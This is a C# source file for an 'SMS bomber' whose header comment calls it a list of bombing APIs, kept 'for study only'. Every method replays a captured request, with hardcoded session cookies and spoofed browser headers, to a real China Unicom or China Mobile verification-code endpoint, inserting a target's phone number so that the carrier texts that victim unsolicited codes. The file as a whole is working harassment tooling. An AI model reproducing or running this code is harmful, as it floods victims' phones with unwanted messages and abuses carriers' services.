using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace SMSBoooooM
{
    /// <summary>
    /// 短信轰炸API列表
    /// 为防止非法用途，请不要在此提交短信API接口
    /// 此接口列表为一年前捕获，并已停止更新，仅供学习交流使用。
    /// </summary>
    public class SMSAPI
    {
        #region Common
        private string mobile;

        private HttpWebResponse response;
        public SMSAPI(string mobile)
        {
            this.mobile = mobile;
        }

        private string ResponseStr(HttpWebResponse response)
        {
            var msg = "";
            try
            {
                Stream receiveStream = response.GetResponseStream();
                var readStream = new StreamReader(receiveStream, Encoding.UTF8);
                msg = readStream.ReadToEnd();
                readStream.Close();
                response.Close();
            }
            catch (Exception ex)
            {
                msg = ex.Message;
            }
            return msg;
        }

        #endregion

        #region 5G预约_10010

        [IsAPI("联通5G预约")]
        public string SMS_5G()
        {
            Request_m_client_10010_com(out response);
            return ResponseStr(response);
        }

        private bool Request_m_client_10010_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://m.client.10010.com/fiveGOrder/fiveGOrder/getVerificationCode.do");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://m.client.10010.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; U; Android 9; zh-cn; Mi Note 3 Build/PKQ1.181007.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.0.6";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://m.client.10010.com/fiveGOrder/fiveGOrder/orderInit.do";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"fiveGOrder=98705c4b799d113cc5e5d5e20ffe4ace; JSESSIONID=F45ACAA68755B09D2AA0CEF224FC40F9; mobileService1=caBn2863XYhfn8K1NblAeEWL_8rvIESK1EZg52wTMYk-_zG01bqZ!1504281042; c_sfbm=234g_00; ecs_acc=; req_mobile=; req_serial=; req_wheel=ssss; clientid=98|0");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format("phone={0}",mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        # region 移动实名

        [IsAPI("移动实名")]
        public string SMS_YD()
        {
            Request_smz_cmcc_cs_cn_30026(out response);
            return ResponseStr(response);
        }
        private bool Request_smz_cmcc_cs_cn_30026(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://smz.cmcc-cs.cn:30026/edcreg/weChatRegist/getProvCode");

                request.KeepAlive = true;
                request.Accept = "text/plain, */*; q=0.01";
                request.Headers.Add("Origin", @"https://smz.cmcc-cs.cn:30026");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/4G Language/zh_CN";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "https://smz.cmcc-cs.cn:30026/edcreg-web/videorealname/wechatRegister/ph-realname.html?requestSource=000002&transactionID=00000220150428193030100001";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"JSESSIONID=51AF4FC6AA074D50066B5189F34BE2A6");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"transactionId=108520191011153508424020&billId="+mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 移动套餐1
        [IsAPI("移动套餐1")]
        public string SMS_YD2()
        {
            Request_pcweb_mmarket_com(out response);
            return ResponseStr(response);
        }
        private bool Request_pcweb_mmarket_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://pcweb.mmarket.com/MobileAss/api/adjustCode.html?sid=16A61043B9D7F66E29E68656D2BEC995&tag=1&mobile="+mobile);

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/4G Language/zh_CN";
                request.Referer = "http://pcweb.mmarket.com/MobileAss/acti/freegdjh.html?param=776022e9b80c9fd4b9cff33673eb7e9c635ba5ae2b4f7cad2b1df8ab078c4cacf15d77f8602279b32249a490cd5a449a7c18af30a91639a5aeb61ef286371f9337efede37f9a6a6e59bbed1126c73ddca172c9e1963b660b898d648ffcc30446f2acca548fd7f3642c53ce954948c851";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"JSESSIONID=16A61043B9D7F66E29E68656D2BEC995; udata_account_300011877320=qWPzYRZmON4l6cQEkz7oIjL2M9VqYkHHb8eP6Sn2Q%2Fs%3D; userid_300011877320=1570784108832597653; udata_s_300011877320=1570784108851166459; udata_lt_300011877320=1570784108854494554");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 联通营业厅

        [IsAPI("联通营业厅")]
        public string SMS_UAC()
        {
            Request_uac_10010_com(out response);
            return ResponseStr(response);
        }

        private bool Request_uac_10010_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17207696755674541829_1570845018041&req_time=1570846384722&_=1570846384722&mobile="+mobile);

                request.KeepAlive = true;
                request.Accept = "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://uac.10010.com/portal/homeLoginNew";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"UM_distinctid=16cbdbabd25504-03cb92995c000f-3c375f0d-1fa400-16cbdbabd2696f; mallcity=71|710; userprocode=071; citycode=710; WT_FPC=id=2c442e041b68183a54a1570844952678:lv=1570844952680:ss=1570844952678; SHOP_PROV_CITY=; _n3fa_cid=bd60b1a2598e4c2df67c792b62fd832c; _n3fa_ext=ft=1570845018; _n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1570845018; _n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1570845018; unisecid=497216DB783E50BEAF8D1856B07F6935; ckuuid=8c3f948be0291205141c86091c3a8593");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 移动营业厅

        [IsAPI("移动营业厅")]
        public string SMS_10086Login()
        {
            Request_login_10086_cn(out response);
            return ResponseStr(response);
        }

        private bool Request_login_10086_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://login.10086.cn/sendRandomCodeAction.action");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://login.10086.cn");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("Xa-before", @"29549010334326259306814739739578");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://login.10086.cn/login.html?channelID=12034&backUrl=http%3A%2F%2Fwww.10086.cn%2Findex%2Fhb%2Findex_270_270.html";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"CmLocation=270|270; CmProvid=hb; WT_FPC=id=2ec89303d4751a959ee1570846828374:lv=1570846828745:ss=1570846828374; sendflag=20191012102030757793; CaptchaCode=YeIGCU; rdmdmd5=D98D3C5F6EA5A29937D2C2E0F43E7031; captchatype=z; lgToken=5594deb9d90446028e3b015c44a17a35");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format(@"userName={0}&type=01&channelID=12034",mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 联通活动2
        [IsAPI("联通活动2")]
        public string SMS_HD2()
        {
            Request_m_client_10010_com2(out response);
            return ResponseStr(response);
        }
        private bool Request_m_client_10010_com2(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://m.client.10010.com/redpacketsplit/static/sharesendmess/sendRandomCode");

                request.KeepAlive = true;
                request.Accept = "text/plain, */*; q=0.01";
                request.Headers.Add("Origin", @"https://m.client.10010.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/WIFI Language/zh_CN";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "https://m.client.10010.com/redpacketsplit/view/index_red.jsp?orderId=WTh4ZzZDbQ==&from=singlemessage";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"ecs_acc=; req_mobile=; req_serial=; clientid=98|0; req_wheel=ssss; mallcity=31|310; SHOP_PROV_CITY=; WT_FPC=id=22deddba164b7e6975f1570588532057:lv=1570588532064:ss=1570588532057; MHistoryGoodsInfo=991909266772%3A%2Fuploader%2Ftemp%2F201909260947121654882672_50_50.jpg%3A%E3%80%90%E5%85%8D%E6%81%AF%E5%88%86%E6%9C%9F%E8%B4%AD%E6%9C%BA%E3%80%91%E4%B8%89%E6%98%9FGalaxyNote10%2B%2012GB%2B256GB%EF%BC%88SM-N9760%EF%BC%895G%E7%89%88IP68%E9%98%B2%E6%B0%B4%E9%AA%81%E9%BE%99855%E5%85%A8%E7%BD%91%E9%80%9A5G%E6%89%8B%E6%9C%BA%3A7499%3A0%3A%3A%3A; Hm_lvt_9208c8c641bfb0560ce7884c36938d9d=1570588533; Hm_lpvt_9208c8c641bfb0560ce7884c36938d9d=1570588533; UID=2YLLrFHA0kWltPzHVY8J0MfHX3PTfVCE; route=fc8400c61fd9789255b44ebc489bb9c3; redpacketsplit=gEXH23a4rwMF6CCwAQMOV6DyKQofPT_Di5CJhUBIOACN5nYPTwvl!-1874896759");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile="+mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

    }
}
